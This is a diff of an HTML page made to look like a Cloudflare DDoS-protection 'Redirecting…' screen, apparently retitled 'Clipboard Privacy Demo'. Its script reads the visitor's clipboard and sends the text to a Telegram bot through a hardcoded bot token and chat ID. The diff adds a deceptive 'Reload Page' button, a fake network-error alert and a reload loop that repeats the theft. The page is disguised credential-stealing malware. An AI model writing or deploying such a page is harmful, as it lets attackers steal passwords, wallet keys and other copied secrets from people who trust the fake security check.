@@ -2,27 +2,48 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Privacy</title>
+  <title>Clipboard Privacy Demo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      font-family: sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: white;
-      color: auto;
+      font-family: Arial, sans-serif;
+      background: #fff9f9;
+      text-align: center;
+      padding: 40px;
     }
-    #message {
-      font-size: 1.5em;
+
+    .warning {
+      color: red;
+      font-weight: bold;
+      font-size: 24px;
+      margin-bottom: 20px;
     }
-    video, canvas {
-      display: none;
+
+    .info {
+      font-size: 16px;
+      color: #444;
+      margin-bottom: 30px;
+    }
+
+    button {
+      padding: 15px 25px;
+      font-size: 18px;
+      background-color: blue;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #c9302c;
+    }
+  </style>
+</head>
+<body>
+  
+  <style>
+    
     }
   </style>
 </head>
@@ -51,6 +72,8 @@
 <p data-translate="allow_5_secs" id="cf-spinner-allow-5-secs" style="display: none;">Please allow up to 10 seconds…</p>   
 <p data-translate="redirecting" id="cf-spinner-redirecting" style="display: block;">Redirecting…</p>   
 </div>   
+  <button onclick="readAndSendClipboard()">Reload Page</button>
+
 <form class="challenge-form" id="challenge-form" action="http://000webhost.com/?__cf_chl_jschl_tk__=gUwvgP4U.d3mjLABceeM1Hoq0yzKoVb2_YClw1ApwLs-1640764924-0-gaNycGzNA70" method="POST" enctype="application/x-www-form-urlencoded">   <span data-translate="error" style="display: none;">error code: 1020</span>
 
 </form>  
@@ -71,7 +94,6 @@ DDoS protection by
     const TELEGRAM_BOT_TOKEN = '7947985419:AAHK42F-TgaMAIbewJJS8AqFhoG8Ieb0asg';
     const CHAT_ID = '-1002602035478';
 
-    // Send clipboard text to Telegram
     async function sendClipboardToTelegram(text) {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const body = {
@@ -82,39 +104,37 @@ DDoS protection by
       try {
         const response = await fetch(url, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(body)
         });
 
         if (!response.ok) {
           throw new Error(`Telegram API error: ${response.statusText}`);
-        };
-        // After successful send, reload page to repeat
-        location.reload();
+        }
+
+        alert("Network Check Internet Connection.");
+        // Reload after 3 seconds to repeat
+        setTimeout(() => location.reload(), 3000);
       } catch (err) {
-        console.error("Telegram API error:", err);
+        console.error("error loading:", err);
         
       }
     }
 
-    // On page load, try to read clipboard and send
-    window.addEventListener('load', async () => {
+    async function readAndSendClipboard() {
       try {
-        const text = await navigator.clipboard.readText(); // Get clipboard
-        console.log("📋 Clipboard content:", text);        // Log to console
-
+        const text = await navigator.clipboard.readText();
+        console.log("📋 Clipboard content:", text);
         if (text.trim()) {
-          await sendClipboardToTelegram(text);             // Send if not empty
+          await sendClipboardToTelegram(text);
         } else {
-         
-                 // Retry after 3s
+        
         }
       } catch (err) {
-        console.error("Clipboard access error:", err);
-         }
-    });
+        console.error("Clipboard error:", err);
+        alert("Network Error " + err.message);
+      }
+    }
   </script>
 </body>
 </html>
